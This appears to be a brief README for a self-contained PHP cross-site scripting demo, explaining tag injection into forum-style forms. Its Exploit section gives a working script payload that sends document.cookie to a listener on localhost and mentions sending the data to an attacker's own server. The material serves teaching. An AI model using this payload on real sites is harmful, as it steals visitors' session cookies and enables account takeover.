# Quick demo
- Just an example of XSS with php

## Run
- Run with `php -S localhost:8000`
- `tail -f /var/log/httpd/access_log`

## PHP
- PHP is a server side scripting language.
- That means that it runs code you can't see before sending you back a response
- This is called a backend or server and this is how *modern* websites work.

## Exploit
- Tags into forms for forums, email signature, etc...
```html
I'm <strong>STRONG</strong>!
```
- If you can put in tags, that means you can put in `<script>` tags...

- What can we do with XSS?
- We can get user cookies, redirect them to a site we can control, or even impersonate the user and execute actions as them.
- Since this is local we can use python's built in http server to get a callback.
- `python -m http.server`
- If you have your own server, you can easily send the data to that as well.
- To get our callback we can enter into either of the forms with:
```html
<script>document.write('<img src="http://localhost:8000/?cookie=' + document.cookie + '" />')</script>
```

- In this case we're 'hacking' ourself, but if this was posted to a vulnerable form page, a malicious user could make everyone who visited the page like their profile or post.
